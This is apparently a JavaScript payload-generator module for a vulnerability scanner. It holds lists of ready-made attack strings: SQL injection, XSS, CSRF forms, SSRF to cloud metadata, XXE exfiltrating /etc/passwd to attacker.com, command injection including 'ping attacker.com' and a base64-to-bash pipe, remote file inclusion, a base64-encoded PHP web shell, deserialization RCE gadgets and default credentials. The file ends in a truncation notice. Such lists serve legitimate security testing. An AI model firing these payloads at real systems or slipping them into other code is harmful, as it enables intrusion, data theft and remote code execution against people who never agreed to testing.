/**
 * Utility for generating payloads for various vulnerability tests
 */

/**
 * Generate SQL injection payloads
 * @returns {Array} Array of SQL injection payloads
 */
function generateSqlInjectionPayloads() {
  return [
    // Basic SQL injection payloads
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" --",
    "\" OR \"1\"=\"1\" /*",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "OR 1=1 --",
    "' OR 1=1#",
    "\" OR 1=1#",
    "OR 1=1#",
    "' OR 1=1 LIMIT 1 --",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    
    // Error-based SQL injection payloads
    "' AND 1=0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9 --",
    "' AND 1=0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 --",
    "' AND 1=0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11 --",
    "' AND 1=0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12 --",
    
    // Boolean-based blind SQL injection payloads
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND 1=1 AND '1'='1",
    "' AND 1=2 AND '1'='1",
    
    // Time-based blind SQL injection payloads
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(0)))a) --",
    "'; WAITFOR DELAY '0:0:5' --",
    "'; WAITFOR DELAY '0:0:0' --",
    
    // Database specific payloads
    // MySQL
    "' AND SLEEP(5) --",
    "' AND SLEEP(0) --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) --",
    
    // PostgreSQL
    "' AND (SELECT pg_sleep(5)) --",
    "' AND (SELECT pg_sleep(0)) --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) --",
    
    // Microsoft SQL Server
    "' AND WAITFOR DELAY '0:0:5' --",
    "' AND WAITFOR DELAY '0:0:0' --",
    "' AND (SELECT COUNT(*) FROM sysobjects) --",
    
    // Oracle
    "' AND (DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) IS NOT NULL) --",
    "' AND (DBMS_PIPE.RECEIVE_MESSAGE('RDS',0) IS NOT NULL) --",
    "' AND (SELECT COUNT(*) FROM all_tables) --",
    
    // SQLite
    "' AND (SELECT CASE WHEN (1=1) THEN sqlite_version() ELSE 1*'a' END) --",
    "' AND (SELECT CASE WHEN (1=2) THEN sqlite_version() ELSE 1*'a' END) --"
  ];
}

/**
 * Generate XSS payloads
 * @returns {Array} Array of XSS payloads
 */
function generateXssPayloads() {
  return [
    // Basic XSS payloads
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    
    // Attribute-based XSS payloads
    "\" onmouseover=\"alert('XSS')\"",
    "' onmouseover='alert(\"XSS\")'",
    "\" onfocus=\"alert('XSS')\"",
    "' onfocus='alert(\"XSS\")'",
    
    // JavaScript context XSS payloads
    "\";alert('XSS');//",
    "';alert('XSS');//",
    
    // DOM-based XSS payloads
    "<a href=\"javascript:alert('XSS')\">Click me</a>",
    "<div id=\"\" onclick=\"alert('XSS')\">Click me</div>",
    
    // Encoded XSS payloads
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "<scr\u0069pt>alert('XSS')</scr\u0069pt>",
    
    // Bypass filters
    "<scr<script>ipt>alert('XSS')</script>",
    "<img src=x:x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<svg><script>alert('XSS')</script></svg>",
    
    // Event handlers
    "<body onpageshow=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input autofocus onfocus=alert('XSS')>",
    "<select autofocus onfocus=alert('XSS')>",
    
    // CSS-based XSS
    "<div style=\"background-image: url(javascript:alert('XSS'))\">",
    "<div style=\"width: expression(alert('XSS'))\">",
    
    // Meta tag XSS
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">",
    
    // Polyglot XSS
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e"
  ];
}

/**
 * Generate CSRF payloads
 * @returns {Array} Array of CSRF test cases
 */
function generateCsrfPayloads() {
  return [
    // HTML form-based CSRF
    `<form action="https://target.com/api/action" method="POST" id="csrf-form">
      <input type="hidden" name="action" value="delete">
      <input type="hidden" name="id" value="123">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>`,
    
    // JSON-based CSRF
    `<script>
      fetch('https://target.com/api/action', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          action: 'delete',
          id: 123
        })
      });
    </script>`,
    
    // GET-based CSRF
    `<img src="https://target.com/api/action?action=delete&id=123" style="display:none">`,
    
    // CSRF with custom headers
    `<script>
      var xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://target.com/api/action', true);
      xhr.withCredentials = true;
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.send(JSON.stringify({
        action: 'delete',
        id: 123
      }));
    </script>`
  ];
}

/**
 * Generate SSRF payloads
 * @returns {Array} Array of SSRF payloads
 */
function generateSsrfPayloads() {
  return [
    // Basic SSRF payloads
    "http://localhost",
    "http://127.0.0.1",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0177.0.0.1",
    "http://2130706433", // Decimal representation of 127.0.0.1
    "http://0x7f000001", // Hex representation of 127.0.0.1
    
    // Common internal services
    "http://localhost:22",
    "http://localhost:3306",
    "http://localhost:5432",
    "http://localhost:6379",
    "http://localhost:8080",
    "http://localhost:8443",
    "http://localhost:9200",
    
    // Cloud metadata services
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    
    // URL schema bypasses
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "gopher://localhost:25/",
    "dict://localhost:11211/",
    
    // DNS rebinding
    "http://attacker-controlled-domain.com",
    
    // Redirects
    "http://redirector.com?url=http://localhost",
    
    // IP address obfuscation
    "http://0/",
    "http://127.1",
    "http://0177.1",
    "http://2130706433/", // Decimal
    "http://0x7f.0x0.0x0.0x1/", // Hex with dots
    
    // IPv6 variations
    "http://[::ffff:127.0.0.1]",
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    
    // Domain name variations
    "http://localhost.localdomain",
    "http://127.0.0.1.xip.io",
    
    // URL encoded bypasses
    "http://%6c%6f%63%61%6c%68%6f%73%74", // localhost URL encoded
    
    // Double URL encoding
    "http://%25%36%31%25%33%30%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31" // 127.0.0.1 double URL encoded
  ];
}

/**
 * Generate XXE payloads
 * @returns {Array} Array of XXE payloads
 */
function generateXxePayloads() {
  return [
    // Basic XXE
    `<?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [
     <!ELEMENT foo ANY >
     <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
     <foo>&xxe;</foo>`,
    
    // XXE to read a local file (Windows)
    `<?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [
     <!ELEMENT foo ANY >
     <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
     <foo>&xxe;</foo>`,
    
    // XXE to perform SSRF
    `<?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [
     <!ELEMENT foo ANY >
     <!ENTITY xxe SYSTEM "http://internal-service:8080" >]>
     <foo>&xxe;</foo>`,
    
    // XXE with parameter entities
    `<?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [
     <!ENTITY % xxe SYSTEM "file:///etc/passwd">
     <!ENTITY % test "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%xxe;'>">
     %test;
     %send;
     ]>
     <foo>test</foo>`,
    
    // XXE with DTD file
    `<?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
     <foo>test</foo>`,
    
    // XXE with CDATA
    `<?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [
     <!ELEMENT foo ANY >
     <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
     <!ENTITY % cdata "<!ENTITY &#x25; test SYSTEM 'http://attacker.com/?%xxe;'>">
     %cdata;
     %test;
     ]>
     <foo><![CDATA[test]]></foo>`,
    
    // XXE with XInclude
    `<?xml version="1.0" encoding="ISO-8859-1"?>
     <foo xmlns:xi="http://www.w3.org/2001/XInclude">
     <xi:include parse="text" href="file:///etc/passwd"/>
     </foo>`,
    
    // XXE with SVG
    `<?xml version="1.0" standalone="yes"?>
     <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
     <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
       <text font-size="16" x="0" y="16">&xxe;</text>
     </svg>`
  ];
}

/**
 * Generate command injection payloads
 * @returns {Array} Array of command injection payloads
 */
function generateCommandInjectionPayloads() {
  return [
    // Basic command injection
    "; ls -la",
    "& ls -la",
    "| ls -la",
    "|| ls -la",
    "& ls -la &",
    "; ls -la;",
    "%0Als -la",
    
    // Command substitution
    "`ls -la`",
    "$(ls -la)",
    
    // Newline injection
    "\\nls -la",
    "%0Als -la",
    
    // Windows specific
    "& dir",
    "| dir",
    "& type C:\\Windows\\win.ini",
    
    // Unix specific
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "$(cat /etc/passwd)",
    
    // Blind command injection
    "; ping -c 5 attacker.com",
    "& ping -c 5 attacker.com",
    "| ping -c 5 attacker.com",
    
    // Time-based blind command injection
    "; sleep 5",
    "& sleep 5",
    "| sleep 5",
    
    // Bypassing filters
    "';'ls -la",
    "'&'ls -la",
    "'|'ls -la",
    "\";\"ls -la",
    "\"&\"ls -la",
    "\"|\"ls -la",
    
    // URL encoded
    "%3B%20ls%20-la",
    "%26%20ls%20-la",
    "%7C%20ls%20-la",
    
    // Double URL encoded
    "%253B%2520ls%2520-la",
    "%2526%2520ls%2520-la",
    "%257C%2520ls%2520-la",
    
    // Unicode encoded
    "%u003B ls -la",
    "%u0026 ls -la",
    "%u007C ls -la",
    
    // Hex encoded
    "\\x3B ls -la",
    "\\x26 ls -la",
    "\\x7C ls -la",
    
    // Base64 encoded
    "echo 'bHMgLWxh' | base64 -d | bash"
  ];
}

/**
 * Generate file inclusion payloads
 * @returns {Array} Array of file inclusion payloads
 */
function generateFileInclusionPayloads() {
  return [
    // Local File Inclusion (LFI)
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../etc/passwd",
    
    // Windows LFI
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
    
    // Path traversal with encoding
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
    
    // Null byte injection (for older PHP versions)
    "../../../etc/passwd%00",
    "../../../etc/passwd\0",
    
    // Remote File Inclusion (RFI)
    "http://attacker.com/malicious.php",
    "https://attacker.com/malicious.php",
    "ftp://attacker.com/malicious.php",
    
    // PHP wrapper
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
    
    // Data wrapper
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
    
    // Zip wrapper
    "zip://shell.jpg%23payload.php",
    
    // Bypassing filters
    "....//....//....//etc/passwd",
    "..../..../..../etc/passwd",
    "..///////..///////etc/passwd",
    "/etc/passwd",
    
    // Double encoding
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    
    // Unicode encoding
    "%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd",
    
    // Using non-standard paths
    "/var/www/html/index.php",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    "/proc/self/status",
    "/proc/self/exe",
    
    // Using log files for LFI to RCE
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    
    // Using session files
    "/var/lib/php/sessions/sess_[SESSION_ID]",
    "/tmp/sess_[SESSION_ID]"
  ];
}

/**
 * Generate insecure deserialization payloads
 * @returns {Array} Array of insecure deserialization payloads
 */
function generateDeserializationPayloads() {
  return [
    // PHP serialized payloads
    'O:8:"stdClass":1:{s:1:"x";s:17:"system(\'id\');";}}',
    'a:1:{i:0;O:8:"stdClass":1:{s:1:"x";s:17:"system(\'id\');";}}',
    
    // Java serialized payloads (simplified representation)
    'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwABDAAAeHB3BAAAAAF0AANhYmN3',
    
    // Python pickle payloads
    'cposix\nsystem\n(S\'id\'\ntR.',
    'cos\nsystem\n(S\'id\'\ntR.',
    
    // Node.js payloads
    '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(error, stdout, stderr) { console.log(stdout) });}()"}',
    
    // Ruby Marshal payloads
    '\x04\x08o:\x0BKernel\x06:\x15@stored_moduleTU:\x10IO\x07\x06:\x06readl\x2B\x00',
    
    // .NET payloads
    '<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider x:Key="LaunchCalc" ObjectType="{x:Type Diag:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><System:String>cmd</System:String><System:String>/c calc</System:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>'
  ];
}

/**
 * Generate authentication bypass payloads
 * @returns {Array} Array of authentication bypass payloads
 */
function generateAuthBypassPayloads() {
  return [
    // SQL injection for authentication bypass
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    
    // Default credentials
    "admin:admin",
    "admin:password",
    "admin:123456",
    "admin:admin123",
    "root:root",
    "root:toor",
    "administrator:administrator",
    "administrator:password",
    
    // Brute force protection bypass
    "X-Forwarded-For: 127.0.0.1",
    "X-Originating-IP: 127.0.0.1",
    "X-Remote-IP: 127.0.0.1",
    "X-Remote-Addr: 127.0.0.1",
    
    // JWT token tampering
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.",
    
    // Session fixation
    "PHPSESSID=1234567890abcdef",
    
    // OAuth bypass
    "?code=STOLEN_AUTHORIZATION_CODE",
    
    // SAML bypass
    "<saml:AttributeValue>admin</saml:AttributeValue>",
    
    // Remember me functionality
    "remember_me=1",
    
    // Password reset token
    "reset_token=1234567890abcdef",
    
    // 2FA bypass
    "otp=123456",
    
    // Cookie manipulation
    "role=admin",
    "isAdmin=true",
    "access_level=9",
    
    // HTTP verb tampering
    "X-HTTP-Method-Override: PUT"
(Content truncated due to size limit. Use line ranges to read in chunks)